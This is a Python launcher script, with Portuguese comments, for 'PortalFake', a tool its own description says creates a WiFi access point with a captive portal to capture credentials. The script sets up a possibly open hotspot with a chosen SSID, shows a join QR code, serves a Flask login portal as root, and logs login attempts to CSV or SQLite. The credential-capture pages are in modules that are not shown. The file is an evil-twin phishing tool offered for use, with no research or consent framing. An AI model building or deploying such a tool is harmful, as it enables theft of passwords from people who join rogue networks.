#!/usr/bin/env python3
import os
import time
import signal
import argparse
import threading
import sys
from typing import Optional
from dotenv import load_dotenv

# Importa módulos locais
from network.hotspot import Hotspot
from qr.generator import display_qr_terminal
from portal.app import create_app

def parse_arguments():
    """
    Analisa argumentos da linha de comando.
    
    Returns:
        Objeto com os argumentos analisados
    """
    parser = argparse.ArgumentParser(
        description='PortalFake - Cria um ponto de acesso com portal cativo para captura de credenciais'
    )
    
    parser.add_argument('--ssid', type=str, help='Nome da rede WiFi (SSID)')
    parser.add_argument('--password', type=str, help='Senha da rede WiFi (opcional)')
    parser.add_argument('--open', action='store_true', help='Criar rede aberta (sem senha)')
    parser.add_argument('--interface', type=str, help='Interface de rede WiFi (detectada automaticamente se não especificada)')
    parser.add_argument('--log-type', type=str, choices=['csv', 'sqlite'], default='csv', 
                        help='Tipo de log para tentativas de login (csv ou sqlite)')
    
    return parser.parse_args()

def signal_handler(sig, frame):
    """
    Manipulador de sinal para encerrar graciosamente.
    """
    print("\nEncerrando PortalFake...")
    # A variável global hotspot será definida no escopo principal
    if 'hotspot' in globals() and hotspot:
        hotspot.stop()
    sys.exit(0)

def start_flask_app():
    """
    Inicia a aplicação Flask em thread separada.
    """
    app = create_app()
    # Usa a porta 80, que requer privilégios de root
    app.run(host='0.0.0.0', port=80, threaded=True)

def main():
    """
    Função principal do programa.
    """
    # Registrar manipulador de sinal para CTRL+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Carregar variáveis de ambiente do arquivo .env se existir
    load_dotenv()
    
    # Analisar argumentos da linha de comando
    args = parse_arguments()
    
    # Prioridade: argumentos CLI > arquivo .env > valores padrão
    ssid = args.ssid or os.getenv('WIFI_SSID') or 'PortalFake'
    password = None
    
    if not args.open:
        password = args.password or os.getenv('WIFI_PASSWORD')
    
    interface = args.interface or os.getenv('WIFI_INTERFACE')
    
    # Inicializar o hotspot
    global hotspot
    hotspot = Hotspot()
    
    # Configurar o hotspot
    setup_ok = hotspot.setup(ssid, password, interface)
    if not setup_ok:
        print("Falha ao configurar o hotspot. Verifique os requisitos e privilégios.")
        sys.exit(1)
    
    # Iniciar o hotspot
    start_ok = hotspot.start()
    if not start_ok:
        print("Falha ao iniciar o hotspot.")
        sys.exit(1)
    
    print(f"Hotspot iniciado com sucesso.")
    print(f"SSID: {ssid}")
    print(f"Senha: {'<sem senha>' if not password else password}")
    print(f"Interface: {hotspot.interface}")
    
    # Exibir QR Code
    display_qr_terminal(ssid, password)
    
    # Iniciar o portal cativo em uma thread separada
    flask_thread = threading.Thread(target=start_flask_app, daemon=True)
    flask_thread.start()
    
    print(f"\nPortal cativo em execução em http://192.168.42.1:80")
    print("Pressione CTRL+C para encerrar.")
    
    try:
        # Manter o programa em execução
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        print("\nEncerrando PortalFake...")
        hotspot.stop()

if __name__ == "__main__":
    # Verificar privilégios de root
    if os.geteuid() != 0:
        print("Este programa precisa ser executado como root (sudo)")
        sys.exit(1)
    
    main()
